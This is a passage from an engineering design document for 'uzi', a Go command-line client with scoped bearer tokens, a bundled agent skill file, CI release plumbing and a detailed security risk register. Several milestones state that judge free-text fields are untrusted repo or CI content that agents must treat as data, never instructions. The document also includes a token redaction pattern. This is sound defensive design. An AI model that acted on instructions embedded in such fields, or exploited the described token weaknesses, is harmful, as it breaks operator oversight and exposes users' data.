eighth limiter parameter; the earlier "no new limiter, so no new parameter" reasoning was
cost-optimising the wrong thing — a broken login is not worth a saved argument.

### The CLI (`api/cmd/uzi/` + `api/internal/uzicli/`)

Placement is inside the **existing api module**. The Go internal rule admits it (`api/internal/…`
is importable by anything rooted at `api/`), it sits beside `api/cmd/server/`, and — measured —
it is **auto-covered by the existing CI**: `.go_job` does `cd api`, `validate:api` runs
`go vet ./... && go build ./...`, `test:api` runs `go test ./...` (`.gitlab-ci.yml:116-133`).
**Zero new validate/test jobs**, and it auto-joins `.gate_needs`.

```
api/cmd/uzi/                 # package main: cobra tree, one file per noun
api/internal/uzicli/         # client, config, authflow, output, skill  (mirrors multica's server/internal/cli)
  skill/SKILL.md             # the go:embed'ed asset
api/internal/apitypes/       # stdlib-only leaf; handlers serialize these
Formula/uzi-cli.rb           # SOURCE OF TRUTH; release CI copies it into the tap
scripts/brew-local-test.sh   # example-app's harness, adapted
```

**`apitypes` exists for binary hygiene, not contract carrying.** In-module, the contract is the
compiler for free. But importing `internal/handler` for a DTO would drag chi + pgx into a CLI
binary, so the CLI imports **only leaf packages**. Enforced mechanically: `go list -deps ./cmd/uzi`
must contain no `pgx` and no `chi`.

**Command tree** (noun-verb):

```
uzi login | logout | auth token [--with-token] | auth status | whoami
uzi run list|get|logs [--follow]|review|create|approve|reject|cancel|follow-up
                                   # `review` is READ-ONLY: no `rejudge` verb, it spends
                                   # the owner's Anthropic token (webui action)
uzi worker list|rm                 # NO `create`: minting a join token is a webui action (it
                                   # returns a credential that reads decrypted secrets)
uzi repo list
uzi admin users|runs|workers|usage|rate-limits    # READ-ONLY; needs a uza_ token
uzi skill status|install [--force]
uzi version
```
Global: `--json --url --quiet --no-color`.
**There is deliberately no `--token` flag.** It would put the credential on `argv`, readable via
`ps` and `/proc/<pid>/cmdline` by any local process — contradicting the very reason
`uzi auth token` reads stdin, and contradicting the worker's own discipline (ARCHITECTURE.md:
the PAT goes in env-scoped git config, "not `git -c`, whose values are readable on argv").
`UZI_TOKEN` plus the 0600 credentials file cover every case, including CI.
`run approve/reject/cancel/follow-up` all map to the **one** measured endpoint
`POST /api/runs/{id}/inputs` with `kind ∈ {approve_plan, reject_plan, cancel, follow_up}`
(`handler/workers.go:650`); `--agents` maps to the structured `selection` field (`:644`), which
the server validates against the run's real roster. `uzi admin` has **no write verbs by
construction** — the endpoints are cookie-only, so there is nothing for the CLI to call.

**Output**: human tables on a TTY; `--json` for agents. A non-TTY stdout disables colour and
spinners (and `NO_COLOR` is honoured) but **does not auto-switch to JSON** — a pipe silently
changing format is a footgun. Agents pass `--json` explicitly.

**Exit codes** (documented in the SKILL.md so agents branch without parsing prose):

| 0 | 1 | 2 | 3 | 4 | 5 | 6 |
|---|---|---|---|---|---|---|
| success | generic error | usage error | auth required / invalid / wrong scope | not found | conflict (e.g. run finished) | server unreachable / 5xx |

**Config + credentials**: `~/.config/uzi/config.toml` (0644) and `credentials.toml` (**0600**, dir
0700; refuse to read if group/world-readable). `UZI_URL` / `UZI_TOKEN` override the files —
mandatory for agents/CI, where there is no interactive login and often no `$HOME`. In GitLab CI,
`UZI_TOKEN` must be a **masked** variable.

⚠️ **The path is hardcoded to `~/.config/uzi/`. Do NOT "fix" it to honour `$XDG_CONFIG_HOME`.**
This is the obvious improvement a future reviewer will request, and it is a trap: on at least one
machine in this team `XDG_CONFIG_HOME` points into a **git-tracked, mackup-synced repo**, so
honouring it would write a never-expiring `uzc_` into version control. The hardcoded path is only
*accidentally* safe today, so the reason is recorded here to make it deliberate. If XDG support is
ever genuinely wanted, it must refuse to write a credential into a directory inside a git
worktree. The config is a
**map of contexts from day one** (`[contexts.default]`) so `uzi context use` is later additive,
not a file-format migration; the user runs two instances (compose laptop + `uzi.example.com`).
*Rejected: macOS Keychain* — cross-platform complexity, and containerised agents need the file
path anyway, so it would be a second mechanism, not a replacement.

### Skill self-upgrade

`go:embed` → `~/.claude/skills/uzi-cli/SKILL.md`, in the measured format
(`agent/src/skills-plugin.ts:85`): `---\nname: …\ndescription: …\n---\n\n<body>`, plus
`allowed-tools: Bash(uzi *)` and `user-invocable: false` (multica's builtin-skill frontmatter).

- **Staleness = content hash, not CLI version.** A sidecar `.uzi-cli-state.json` records
  `{cli_version, skill_sha256}`; rewrite iff `embedded_sha != recorded_sha`. Keying on the CLI
  version would rewrite on every unrelated release.
- **User-edited file**: if `sha(on-disk) != recorded_sha`, copy to `SKILL.md.bak`, write, warn
  once on **stderr**. *Rejected*: silent overwrite (hostile — destroys work in a directory we
  merely *declared* ours) and skip-and-warn (leaves agents driving a stale CLI forever).
- **Never fatal, never blocking.** Any install error warns on stderr; the real command still runs.
  A read-only `$HOME` (CI containers) must not break `uzi run list --json`. Escape hatches:
  `UZI_SKILL_AUTO_UPGRADE=0`, `uzi skill status`, `uzi skill install --force`.
- **Atomic**: temp file in the same dir + `os.Rename`; handles racing `uzi` processes without a
  lockfile.
- **Cannot clobber `~/.claude/commands/`**: the write path is a compile-time constant joined to
  `os.UserHomeDir()` with **no user-supplied component**, so no traversal is expressible; it never
  enumerates or writes `commands/`. Measured: the two trees are disjoint on a real machine
  (skills → `find-skills`; commands → the dot-ai set).
- **Drift control**: a test asserts every command/flag the SKILL.md documents exists in the cobra
  tree. This is multica's `references/*-source-map.md` idea done **mechanically** instead of by
  hand — possible for us precisely because our skill documents our own CLI.

### Release + CI

**The CLI rides uzi's existing `v*` tags**; no separate `uzi-cli-<version>` tag. PRD #52 already
made `v*` mean "the whole product releases", and uzi has real tags (`v0.1.0`, `v0.2.0`), so the
formula pins a **real tag**, never a pseudo-version. The payoff: **`uzi version` == the API
version the binary was compiled against**, making the skew check exact rather than heuristic.
Accepted cost: a web-only release bumps the CLI cosmetically.

**Brew**: build-from-source, `url "git@gitlab.example.com:vtmocanu/uzi.git", using: :git,
tag: "vX.Y.Z"`, `depends_on "go" => :build`,
`system "go", "build", *std_go_args(ldflags: "-s -w -X main.version=#{version}")`.
**No `vendor/`** — see Decision Log 9.

**CI: one new job.** `publish_brew` (tag-only), modelled on `example-app/.gitlab-ci.yml:235`:

```yaml
publish_brew:
  stage: publish
  needs: *publish_needs          # atomic release: a failing gate blocks the brew publish
  rules:
    - if: '$CI_COMMIT_TAG'       # SELF-GATED, never workflow.rules alone
```

Respecting the documented trust boundary (PRD #52 Decision 2 — agent-authored MRs can edit this
file, and an MR pipeline runs the MR's own CI): `TAP_WRITE_TOKEN` is injected **PROTECTED +
MASKED**, exactly like `HARBOR_USERNAME`/`HARBOR_PASSWORD`, so it is **absent on MR refs**; the
job self-gates on `$CI_COMMIT_TAG` rather than relying on `workflow.rules`. A
`$UZI_CI_DEMO_FAIL == "1"` pipeline never runs it (inherited free — it only runs on tags).

## User Journey

**Human, first run.** `brew install uzi-cli` → `uzi login` → the CLI prints a `user_code` and
opens the browser → the user logs in however this instance does it (password or the SSO button)
→ the consent screen names the host + code + scope → Approve → the CLI's poll returns a token,
saved 0600. `uzi run list` now prints a table. Total IdP configuration: none.

**Agent, headless.** An operator mints a static token in Settings → Access → copies it once →
sets `UZI_TOKEN`. The agent runs `uzi run list --json`, branches on exit codes, and — because the
CLI wrote `~/.claude/skills/uzi-cli/SKILL.md` on first run — already knows the command surface
without being told.

**Admin.** Mints an `admin_ro` token explicitly (it is never the default), runs
`uzi admin runs --json` to see the whole factory. `uzi admin` offers no writes; those stay in the
browser.

## Milestones

Phase 1 (parallel — disjoint files):

- [x] **M1: `apitypes` leaf extraction** — `api/internal/apitypes/` (stdlib-only); handlers
  re-pointed. Pure refactor, no behaviour change. **The set is exactly the DTOs behind the
  `RequireUser` routes** (so an M1 agent running beside M3 need not guess it):

  | Endpoint | DTO |
  |---|---|
  | `GET /api/auth/me` | `userDTO` (`handler/handler.go:199`) |
  | `GET /api/runs`, `GET /api/runs/{id}` | the run DTO + its health/reason fields (**`handler/workers.go:164-200`**) and the `runListItemDTO` wrapper (`handler/runs.go`) — the set spans **both** files |
  | `GET /api/runs/{id}/messages` | the run-message DTO (incl. `seq`) |
  | `GET /api/runs/{id}/review` | `reviewDTO` **+ `recommendationDTO`** (`handler/judge.go:90-111`) — both, and note the envelope: the endpoint returns `{"review": …\|null}`, and **`null` is a valid 200** (visible-but-unjudged run), not an error. The CLI and any `--json` consumer must model it as nullable |
  | `POST /api/runs/{id}/inputs` | request `{kind, body, selection}` + `{server_side}` (`handler/workers.go:637-670`) |
  | `GET /api/repos` | the repo DTO (`handler/forge.go`) |
  | `POST /api/repos/{id}/runs` | the create-run request + run DTO |
  | `GET /api/workers` | `workerDTO` only — **`{worker, token}` left the set with D1**: `POST /api/workers` is cookie-only, so the CLI never decodes the mint response and M1's extraction shrinks by that DTO |
  | `GET /api/admin/{users,runs,workers,usage,rate-limits,settings,slack/status,vault-migration,selfimprove}` | the 9 admin read DTOs |
  | `GET /api/me/cli-tokens` | the new token-metadata DTO (M2 authors it directly in `apitypes`) |

  Success: `go test ./...` green **and** the existing handler tests that already assert these
  payloads still pass unmodified, proving byte-identical JSON. If a DTO has no such test, add the
  assertion **before** moving the type — an extraction without a pinning test is a silent
  contract change.
- [x] **M2: CLI token credential + admin split + the group split** — `clitoken` pkg
  (`uzc_`/`uza_`), `cli_tokens` (draft `00067`, incl. `last_used_ip`), `RequireUser` (**including
  the `IsAdmin=false` context copy for non-`admin_ro` tokens**), `RequireAdminRO`,
  `/api/me/cli-tokens` CRUD **+ `revoke-all`** (all cookie-only), the `/api/admin` 9-read/4-write
  split, and **splitting the `:458` group + the `/auth` group so only the enumerated routes get
  `RequireUser`**. This is the largest milestone; the route-disposition table is its spec.
  *Also verify:* `revoke-all` revokes every un-revoked token of the caller **and nobody else's**,
  and is idempotent (a second call is a no-op returning the same shape).
  Success: a `uzc_` token drives `GET /api/runs`, is refused after revoke/deactivate, and is
  refused by **every** `/api/admin/*`; a `uza_` token reads all 9 admin GETs and is refused by all
  4 admin writes; demoting the owner instantly kills its admin reads; `/api/vault/*` refuses both;
  **a cookie request carrying a bogus `Authorization` header is rejected on the bearer path and
  never silently falls back to the cookie path**.
  **Ceiling criteria — these test the *property*, not the route prefix (a suite passing only the
  `/api/admin/*` checks above would go green with the hole wide open):**
  - **(load-bearing)** an **admin's** `uzc_` gets **404** on another user's
    `GET /api/runs/{id}`, `GET /api/runs/{id}/messages` **and `GET /api/runs/{id}/review`**. After
    the route narrowing, these three are the **only** admin-widening paths left in the swapped set
    (`GetRunForViewer`, `ListRunMessagesForViewer`, `GetReviewForTarget` — the last reads
    `IsAdmin` live at `handler/judge.go:154`, exactly like the other two), so this is the ceiling
    test that actually exercises the masking. **`/review` is not a freebie on the back of the other
    two.** Precisely why *(both reviewers sharpened this)*: at the **service** layer it is not
    independent — `GetReviewForTarget` delegates its visibility check to `GetRunForViewer` as its
    first line (`workersvc/judge_read.go:52`), so a masking bug *there* fails all three identically.
    The divergence the trio test guards is one layer up: the **handler** passes `user.IsAdmin` into
    its own call (`judge.go:154`), and the M2 **route surgery** could land `/review` under different
    middleware than `/{id}` and `/{id}/messages`, or a handler edit could pass the wrong arg — either
    would spare `/review` while both existing tests stayed green, leaking another user's verdict.
    The test earns its place against *routing/handler* drift, not against a service-layer bug.
    **The foreign run in the fixture must be a *judged* one** *(security audit, F-D)*: an unjudged
    foreign run still distinguishes 404 from 200 `{"review":null}`, so the test passes either way,
    but only a judged fixture proves **verdict content** never crosses — the leak it exists to
    prevent;
  - **(load-bearing)** `GET /api/auth/me` over a `uzc_` reports `is_admin:false`; over a `uza_`,
    `true`;
  - *(pins the **routing**, not the ceiling — **not** coverage)* an admin's `uzc_` cannot flip
    another user's repo via `PATCH /api/repos/{id}` (`repo_skills_enabled` **and**
    `repo_devbox_opt_in`). **This passes even with the masking deleted**, because the route
    narrowing made `PATCH /api/repos/{id}` cookie-only, so a Bearer credential 401s at the
    middleware and never reaches the handler. Keep it as **forward-looking defense** — the day
    someone adds `uzi repo enable` and swaps that route, `PatchRepo`'s two unscoped admin branches
    become live again and this test is what catches it. But do not file it under "what F1 would
    have slipped past": a test that cannot fail today is not evidence today;
  - `POST /api/workers` (**D1**), `POST /api/forge/connections`,
    `DELETE /api/me/secrets/anthropic_token`, `POST /api/chats`, `POST /api/auth/logout` **and
    `POST /api/runs/{id}/rejudge`** all reject a Bearer credential. The `POST /api/workers` case is
    the one that matters most: it is the boundary between a revocable uzi credential and a
    plaintext forge PAT.
    **`rejudge` is on this list because Decision 21 made it the PRD's highest ride-along risk, and
    it had no mechanical pin** *(architect review of the D21 amendment)*. After the `/review` swap
    the `/runs` sub-router (`handler.go:539-552`) is **5 swapped, 1 cookie-only** — rejudge alone —
    and "wrap the whole `r.Route("/runs")` group in `RequireUser`" is the single most tempting
    shortcut in M2. **Every other criterion stays green when a coder takes it**: the trio 404
    ceiling test passes, the admin checks pass, and rejudge appeared in no reject list. The result
    is a stolen `uzc_` minting judge runs against the owner's Anthropic budget, with Decision 21's
    exclusion silently void and **no red test anywhere**. This is Decision 15(g) in its purest
    form — a rule recorded and then not re-run against the row it governs — and it was found in an
    amendment that *quotes* 15(g) while committing it.
  **Limiter ordering (easy to break silently while re-parenting routes):** `POST /api/repos/{id}/runs`
  is wrapped in `forgeLimiter.PerUserMiddleware` (`handler.go:501`), which carries an explicit
  contract — *"It MUST run after RequireAuth (which sets the user in context)"*
  (`ratelimit.go:94-96`). It keeps working under the swap **precisely because `RequireUser`
  populates the same `userKey`** (Decision 1), so the contract is satisfied by an equivalent
  middleware. But it **fails soft, not loud**: `PerUserMiddleware` falls back to client IP when the
  user is absent (`ratelimit.go:107-112`), so if the split leaves a limiter above `RequireUser`,
  every CLI caller silently collapses into one IP-keyed bucket and **no test fails**. Keep auth
  first, limiter second.
  *Shares `handler.go` with M1 (different hunks) and with **PRD #58's unmerged `/api/workers`
  edits** — rebase onto post-#58 `main`.*
- [x] **M3: CLI skeleton** — `api/cmd/uzi/` (cobra root, noun stubs) + `api/internal/uzicli/`
  (output: tables/`--json`/exit codes; config: files, perms, env override). Client is an interface
  with a fake; no live calls. Includes the `go list -deps ./cmd/uzi` layering assertion. Success:
  the existing `validate:api`/`test:api` go green with **zero CI edits**; `uzi --help` renders the
  tree; the layering assertion fails when someone imports `internal/handler`.
Phase 1b (**M4 — starts the moment M3's binary compiles; it is not parallel with M3**):

- [x] **M4: brew spike** (still the earliest possible slot — it settles the riskiest assumption
  before any release plumbing exists) — `Formula/uzi-cli.rb` + `scripts/brew-local-test.sh`.
  **Depends on M3**: a from-source formula needs a compilable `api/cmd/uzi` to build at all, and
  the spike tests against M3's binary. It needs only *a binary that builds*, not the real command
  tree, so it can start at M3's first green `go build` rather than M3's completion. **Merge-order
  coupling, stated rather than left implicit**: M4's criterion can only be exercised against M3's
  branch, so M4's MR cannot demonstrate anything on `main` until M3 lands — the same class of
  coupling this PRD already accepts between M1 and M2, just named.
  The formula must `cd`/`buildpath` into `api/` — the module is `api/go.mod`, so `std_go_args`
  from the repo root will not build `./api/cmd/uzi` as written. Success: `brew install` from a
  throwaway local tap compiles and runs `uzi version`; `brew style` clean; **any sandbox/GOPATH
  finding is reported before Phase 2 starts**.

Phase 2 (sequential, except M6 ∥ M7):

- [x] **M5: browser-brokered auth** — `cli_auth_requests` (draft `00068`) +
  `/api/auth/cli/{start,poll,request,approve,deny}`; the server applies the expiry matrix at mint.
  Success: the flow mints exactly one token; a replayed poll 410s; a wrong verifier never mints;
  expiry enforced server-side.
  **Also — teach the redactors the new credential family (Risk 14, security audit F-B).** M5 mints
  `uzc_`/`uza_`, so M5 owns it: add the final token shape (`uz[caw]_[A-Za-z0-9_-]{16,}`, covering
  the pre-existing `uzw_`) to **both** `slacksvc.ScrubSecrets` (`slacksvc/redact.go:45-50`) and
  `snapshotSecretPatterns` (`handler/ci_fix.go:34-41`), with a test sealing a literal `uzc_` through
  the review ingest and the Slack path. **Non-optional and non-deferrable**: this PRD tells users to
  put `UZI_TOKEN` in GitLab CI, so it *creates* the echo-into-a-trace path, and shipping the mint
  without the scrub means the leak exists for however long the gap lasts.
- [x] **M6: SPA surfaces** — CLI-tokens section in Settings (create/list/revoke, show-once,
  **scope picker offered only to admins**) + the `/cli-auth` consent page (names the requesting
  host and the scope; **the user types the `user_code`, not merely compares it**).
  The token list **must render `token_prefix`, `last_used_at` and `last_used_ip`** — they are the
  entire forensic surface (Risk 8), not optional columns — and carries a **"Revoke all" button**
  (`POST /api/me/cli-tokens/revoke-all`) with a confirm step. **Also surface staleness**: flag a
  token unused for 90+ days. *(This is the "low, your call" item — **taken**, but scoped to a
  render-time hint in M6 only: no new column, endpoint, policy or auto-expiry. The argument that
  earns it: `uzc_` never expires and nothing caps the count, so the list grows monotonically and
  "enumerate each one" degrades exactly as it matters most. It is one comparison against a column
  already on screen. Anything more — auto-revoking stale tokens — is a policy change and would need
  its own ruling.)* *Runs parallel with M7 — `web/` vs `api/cmd/uzi/`.*
- [x] **M7: real client + read commands** — `internal/uzicli/client.go` importing `apitypes`
  directly, `uzi auth token` (stdin), `whoami`, `run list/get/logs` (polling `?after=<seq>`),
  `run review`, `worker list`, `repo list`, plus a **malformed-response test**.
  **`run review` specifics** (Decision 21): human output is the verdict line + one row per
  recommendation (category, target, confidence) with the rationale beneath; `--json` passes the
  envelope through. **An unjudged run is exit 0 with "not judged", not exit 4** — the endpoint
  returns 200 `{"review":null}`, and mapping that to not-found would be the CLI inventing an error
  the API deliberately does not raise. Reserve exit 4 for a 404 (run absent or not visible).
  A **`status:"failed"`** review renders the same "judge incomplete" caveat the run page shows — a
  `--json` agent must not read a fallback-only recommendation set as a complete retrospective.
  **The wire value is `failed`, not `incomplete`**: the enum is `{"complete","failed"}`
  (`workersvc/judge_review.go:22`), and *"judge incomplete"* is only the **badge wording** in
  `docs/judge.md:48`. An earlier draft of this milestone said `status:"incomplete"` — a value that
  does not exist, read off a doc's UI copy rather than the enum. Recorded per Decision 15: the CLI
  must branch on `failed`, and a `--json` consumer keying on `"incomplete"` matches nothing,
  silently treating every fallback review as complete.

  **`target`, `rationale_md` and `summary_md` are UNTRUSTED DATA, and the SKILL.md must say so.**
  *(Security audit, 2026-07-17 — F-A, a risk this amendment **creates**.)* See Decision 21.
- [x] **M7b: admin read verbs** — `uzi admin users|runs|workers|usage|rate-limits`, `--json`-first.
  Exits **3** with an actionable message when the token lacks `admin_ro` ("mint an admin-scoped
  token"), not a bare 403. Fold into M7 if preferred.
- [x] **M8: `uzi login` + write commands** — browser flow; `run create/approve/reject/cancel/
  follow-up`; surface the locked-vault health reason.
- [x] **M9: bundled skill + self-upgrade** — `go:embed`, content-hash staleness, `.bak` rescue,
  atomic rename, never-fatal, plus the **skill↔cobra-tree test**. *Needs M8: the skill must
  document the final surface, or it ships stale.* **Concretely, post-D1**: author the SKILL.md
  **after** the tree settles or it will document `uzi worker create`, which no longer exists — and
  the drift test only catches that if the skill is written last (it compares skill to tree, so a
  skill written early and a tree changed later diverge silently until someone re-runs it).

Phase 3 (release + docs):

- [x] **M10: release pipeline** — `publish_brew` (tag-only, `needs: *publish_needs`,
  `TAP_WRITE_TOKEN` protected+masked). Copies `Formula/uzi-cli.rb` into the tap, bumps the pinned
  tag, creates the informational `uzi-cli-<version>` tap tag. Tap README gains the `uzi-cli` row +
  the access caveat. Success: `git tag vX.Y.Z && git push --tags` ⇒ `brew install uzi-cli` on a
  clean machine yields a working binary whose `uzi version` == the tag.
- [x] **M11: docs + the feedback loop (explicit user requirement)** — **`CLAUDE.md` rule: new uzi
  functionality ⇒ check whether `api/cmd/uzi/` needs a matching change**, now enforceable in one MR
  (the thing a separate repo could never offer). Plus ARCHITECTURE.md (the CLI as the second API
  consumer; `RequireUser`/`RequireAdminRO`; the `apitypes` leaf + layering assertion),
  `specs/ai.md` decisions, and a `docs/` page (`audience: user`) for CLI install/auth.
  **The docs page must carry this sentence verbatim**, under a token-management heading:
  > **A password change is NOT an incident-response control for CLI tokens. You must enumerate and
  > revoke each one.**

  …followed by **how, leading with the button, not the enumeration**: Settings → Access →
  **Revoke all** is the one-click answer when a laptop is lost; the list (with `token_prefix`,
  `last_used_at`, `last_used_ip`) is for the case where you want to keep some — revoke anything you
  do not recognise, and treat an unfamiliar `last_used_ip` as the signal to revoke. This is the
  single most important thing a reader of that page can learn, because the assumption it corrects
  ("I rotated my password, I'm fine") is the one a competent admin will otherwise make from every
  other system they have used.
  Also document that `UZI_TOKEN` in GitLab CI must be a **masked** variable.
  **Plus `docs/judge.md`**: its "What you get" list currently names three destinations for a
  finished review (run page, inbox, Slack). The CLI makes a fourth — `uzi run review <id>`, and
  `--json` for agents — and that page is where a reader looks for it. Leaving it at three would
  make the doc quietly wrong the day M7 lands. Keep the `rejudge` exclusion visible there too: the
  **Re-run judge** button stays a webui action (Out of scope). **And carry the Risk 13 contract for
  `--json` consumers**: `target`, `rationale_md` and `summary_md` are judge free text derived from
  untrusted repo/CI content — **data, never instructions**; branch on `verdict`, `category` and
  `confidence`, which are closed enums. Note the wire value for a fallback review is
  **`status:"failed"`**, even though the run page's badge reads *"judge incomplete"* — the doc
  currently only gives the badge wording, which is what misled this PRD's own M7 draft.

### Phasing & parallel-safety

| Phase | Concurrent | Serialised because |
|---|---|---|
| 1 | **M1 ∥ M2 ∥ M3** (3 agents) | M1/M2 share `handler.go` (different hunks); M3 is new files only. One repo ⇒ merge-train contention, not file conflict; `auto_cancel: interruptible` absorbs it. |
| 1b | **M4** | needs a compilable `cmd/uzi` to build from source — starts at M3's first green `go build`, not M3's completion. |
| 2 | (**M5 ∥ M7**) → M6 ∥ M7b → M8 → M9 | **M7 needs only M1+M2+M3** — a static token is mintable by `curl` against M2's endpoint, so the read commands do not wait on the browser flow. M6 (`web/`) and M7 (`api/cmd/uzi/`) are disjoint. |
| 3 | M10 → M11 | the release must exist before it is documented. |

Critical path: **M2 → M5 → M8 → M10 → M11**. (M7 is off the critical path once it runs beside
M5; M8 is the join, since `uzi login` needs M5's endpoints and M7's client.)

## Success Criteria

1. `UZI_TOKEN=uzc_… uzi run list --json | jq -e '.[0].id'` works with **no browser, no cookie, no
   `$HOME`** — the headless/agent requirement.
2. `uzi login` on a password-only compose stack **and** on an OIDC-backed instance both yield a
   working token with **no IdP configuration change**.
3. A revoked token ⇒ exit **3**; a missing run ⇒ exit **4**; approving a finished run ⇒ exit **5**.
4. **The token's authority is capped by its scope — tested as a *property*, not a route prefix.**
   (Criterion 4 is written this way deliberately: an earlier draft tested only "`uzc_` is rejected
   by `/api/admin/*`", which **would have gone green with the F1 hole wide open**. See Decision 7.
   The route prefix is not the boundary; the authority is.)
   - **Cross-user containment**: an **admin's** `uzc_` gets **404** on another user's
     `GET /api/runs/{id}`, `GET /api/runs/{id}/messages` and `GET /api/runs/{id}/review` — those
     three are the only admin-widening paths left in the swapped set, so this is the test that
     actually exercises the masking. Enumerate all three: each handler passes `IsAdmin` into its own
     call, so the M2 route surgery can spare one while the others stay green (Decision 21). The
     `/review` fixture run must be **judged**, so the test proves verdict content never crosses, not
     merely that 404≠200.
   - **Self-report honesty**: `GET /api/auth/me` over a `uzc_` reports `is_admin:false`; over a
     `uza_`, `true`.
   - **Cross-credential-class containment**: a `uzc_` is rejected by **`POST /api/workers`** — the
     boundary between a revocable uzi credential and a plaintext forge PAT (Decision 18).
   - **Spend containment on the sole cookie-only `/runs` route**: a `uzc_` is rejected by
     **`POST /api/runs/{id}/rejudge`** — after the `/review` swap it is the one route in the
     `/runs` group that a "swap the whole group" shortcut would silently expose, and nothing else
     in this list would catch it (Decision 21).
   - **Admin surface**: a `uza_` reads all 9 admin GETs and is rejected by all 4 admin writes;
     `/api/vault/*` rejects any CLI token.
   - **Live demotion**: setting the owner's `is_admin=false` makes a `uza_`'s admin reads fail on
     the next request, with no revocation step.
5. Editing `~/.claude/skills/uzi-cli/SKILL.md`, then running any `uzi` command ⇒ edit preserved at
   `SKILL.md.bak`, new skill installed, warning on stderr, command still exits 0.
6. `brew install uzi-cli` on a clean machine with only an SSH key ⇒ working binary whose
   `uzi version` == the uzi `v*` tag it was built from.
7. **Breaking** a CLI-consumed DTO field ⇒ `validate:api` fails **in the same MR**. (Honest limit:
   an *additive* field change compiles and is ignored by an old binary — by design.)
8. `go list -deps ./cmd/uzi` contains no `pgx` and no `chi`, and the CLI's arrival adds **zero**
   new validate/test jobs to `.gitlab-ci.yml`.
9. The expiry matrix holds in all three cells, and the lifetime is always server-set.

## Risks

1. **Riskiest assumption: a from-source Go formula installs cleanly under Homebrew's sandbox.**
   Unlike example-app's `bin.install` of a script, ours compiles at install time; unverified specifics
   include whether the default `GOMODCACHE` is writable inside the sandbox. **Validate first, in
   M4**, adapting `example-app/onboarding/brew-local-test.sh` (note its cache-clearing trick — Homebrew's
   git strategy caches by formula name and will otherwise silently install a stale build).
   Working hypothesis for the spike to confirm, **not asserted**: Homebrew points `HOME` at a
   sandboxed temp dir, so `$HOME/go/pkg/mod` is already writable. If disproved, the fix is a
   formula-local `ENV["GOPATH"] = buildpath/"gopath"` — **not** vendoring (Decision Log 9).
2. **Consumers need read access to `vtmocanu/uzi`, and installing clones the whole product source.**
   This **knowingly departs** from example-app's documented property (*"consumers need NO credentials …
   and no access to the private example-app repo"* — it vendors its script into the tap). Accepted by the
   user: everyone in `vtmocanu` has group read. Homebrew does not fetch submodules unless asked, so
   `inspiration/` stays out. The `uzi-cli-<version>` tap tag is **informational only** — the
   download pin is uzi's `v*` tag. The tap README must say this, since it contradicts the model it
   documents for example-app.
3. **A `RequireUser` dispatch bug is a CSRF bypass.** Mitigated by presence-dispatch (never
   fallback-on-failure) and pinned by the two M2 tests: cookie + missing CSRF ⇒ 403, and a cookie
   request with a bogus `Authorization` header ⇒ rejected on the bearer path, never silently
   falling back. The second test is the one that matters.
4. **CLI-created runs can queue forever behind a locked vault.** Measured: the claim gate skips
   owners whose vault is locked and runs *"stay queued as waiting for vault unlock instead of
   failing"* (`api/internal/workersvc/service.go`), surfaced as `reasonVaultLocked`
   (`workersvc/health.go`) and tested by `TestClaimGateSkipsLockedOwner`. An agent doing
   `uzi run create` then polling would hang with **no signal**. Pre-existing (autopilot has it),
   newly *visible*: the CLI must surface the health reason in `run get`/`run list` and warn on
   `run create`.
5. **The CLI silently linking the server.** Nothing in Go *stops* importing `internal/handler` from
   `cmd/uzi` for a convenient DTO; it just quietly drags chi + pgx into the binary. Mitigated by the
   `go list -deps` assertion — it fails the build, not a review.
6. **Migration numbers are drafts.** `00067`/`00068` are collision-avoidance only; renumber above
   the live head at the landing rebase.
7. **Local worktree builds**: bare `go build` fails in linked worktrees (VCS stamping); use
   `-buildvcs=false` locally, never commit it. Brew clones a full repo, so the formula is unaffected.
8. **`admin_ro` blast radius. The user's ruling settles *whether to expose*, not *whether it is
   safe*.** Before this PRD, a leaked uzi credential was scoped to one user's own data. A leaked
   `uza_` token reads **every user's** runs (including issue titles and descriptions — actual
   business content), workers, token/cost usage, rate-limit meters, and instance settings.
   "Read-only" does not shrink that much: exfiltration *is* a read. Controls: least privilege by
   default (`scope='user'`); live demotion; the distinct `uza_` prefix (recognizable to humans and
   secret scanners); writes structurally unreachable; `slog.Info` on every `admin_ro` mint plus an
   explicit consent-screen choice; and a **90-day cap on every `uza_` token**, the only control
   bounding *duration*. **Residual, stated plainly**: within those 90 days a stolen `uza_` reads
   the whole factory and **nothing detects it** — there is no per-request audit log, only
   `last_used_at`. Accepted as consistent with uzi's trusted-team model. Do not read the ruling as
   having made it safe.

   **The composition — three properties that are each defensible alone.** A CLI token is
   (a) potentially **unbounded** (webui-minted `uzc_` has no expiry, deliberately — the agent/CI
   path cannot absorb silent death), (b) **exempt from `token_version`**, so logout and password
   change do not touch it (Decision Log 6, GitHub-PAT semantics), and (c) — **before** the F1
   fix — **cross-user capable** whenever its owner was an admin. The F1 `IsAdmin` masking
   **removes (c)**, which is the half that turned a personal credential into a factory-wide one.
   **(a) + (b) remain, and they compose**: a leaked webui-minted `uzc_` is a credential that never
   expires and that no password rotation will invalidate. It is bounded only by the owner's own
   **authority** — deliberately not "data", because a `uzc_` also **writes**: it creates runs
   (spending the Anthropic budget), **approves plan gates** via `POST /api/runs/{id}/inputs` (the
   human-in-the-loop gate ARCHITECTURE.md treats as an authorization control), and deletes
   workers — and by explicit revocation, which **`POST /api/me/cli-tokens/revoke-all` makes a
   single action** rather than an N-click enumeration. That is the accepted posture, recorded —
   not filed as fixed.

   ⚠️ **This paragraph was false while D1 was open, and the correction is the point.** "Bounded by
   the owner's own authority" only became true when `POST /api/workers` went cookie-only
   (Decision 18). Before that, the bound **leaked straight through** the owner's authority to
   *third-party* credentials: `uzc_` → `uzw_` → a plaintext forge PAT and a paid Anthropic
   token — neither of which is uzi's to bound, and both of which outlive revoking the `uzc_`. A
   reader must not take the sentence as an invariant the design always had; it is one D1 bought.

   ⚠️ **A password change is NOT an incident-response control for CLI tokens. You must enumerate
   and revoke each one.** (Same sentence, verbatim, belongs in M11's docs page. It is the sentence
   that stops a future admin assuming a rotation saved them.) The **entire** forensic surface for
   that enumeration is `last_used_at` + `token_prefix` on the token list — which is *why* both are
   in the schema and *why* M6's UI must render them: with no per-request audit log, "which token
   was this, and was it used?" is answerable only from those two columns.
9. **`GET /api/admin/settings` is safe to widen — but on an unenforced convention.** Verified:
   `AdminView` (`api/internal/settings/settings.go:662-678`) fills `Values` by ranging **`Defaults`**
   and `Secrets` by ranging **`SecretKeys`** as a `configured` **bool** only; `SecretKeys` is exactly
   `{slack_bot_token, slack_app_token}` (`:181-184`); the two sets are **disjoint** (verified by
   grep), and `TestSecretKeysStructurallyExcluded`
   (`api/internal/settings/settings_slack_test.go:74`) seals a real `xoxb-…` and asserts it appears
